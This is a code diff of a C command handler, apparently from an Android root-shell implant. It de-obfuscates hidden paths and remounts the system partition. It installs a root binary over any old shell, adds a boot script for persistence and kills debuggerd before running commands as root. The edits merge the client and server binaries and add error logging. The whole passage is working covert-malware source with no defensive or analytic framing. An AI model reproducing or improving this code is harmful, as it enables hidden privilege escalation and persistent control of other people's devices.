@@ -171,7 +171,7 @@ int exec_cmd(int argc, char** argv) {
 		}
 
 		// Check if the shell is already installed and remove it
-		if(stat(deobfuscate(ROOT_SERVER), &st2) >= 0) {
+		if(stat(deobfuscate(ROOT_BIN), &st2) >= 0) {
 		  LOGD("Shell already presents\n");
 		  if(connect_daemon(2, sock_args, OLD_SHELL_PORT) == 0) { 
 		    LOGD("RU executed in the old shell on the old port!\n");
@@ -187,8 +187,7 @@ int exec_cmd(int argc, char** argv) {
 		remount(deobfuscate(system3), 0);
 
 		// Install the new shell
-		copy_root_no_mount(argv[0], deobfuscate(ROOT_CLIENT));  // root client
-		copy_root_no_mount(argv[0], deobfuscate(ROOT_SERVER)); // server
+		copy_root_no_mount(argv[0], deobfuscate(ROOT_BIN));  // root client
 		createBootScript();
 
 		kill_debuggerd();
@@ -240,10 +239,13 @@ int exec_cmd(int argc, char** argv) {
 		    
 		    if(!exec_args[i]) break;
 		  }
-		  execvp(exec_args[0], exec_args);
+		  if(execvp(exec_args[0], exec_args) < 0)
+		    LOGD("Error %d\n", errno);
 		}
-		else 
-		  execvp(argv[2], argv+2);
+		else {
+		  if(execvp(argv[2], argv+2) < 0)
+		    LOGD("Error %d\n", errno);
+		}
 
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
@@ -287,7 +289,7 @@ int exec_cmd(int argc, char** argv) {
 		execvp(shell, exec_args);
 
 		LOGD("Exiting shell\n");
-	}
+	} 
 
 	return 0;
 }
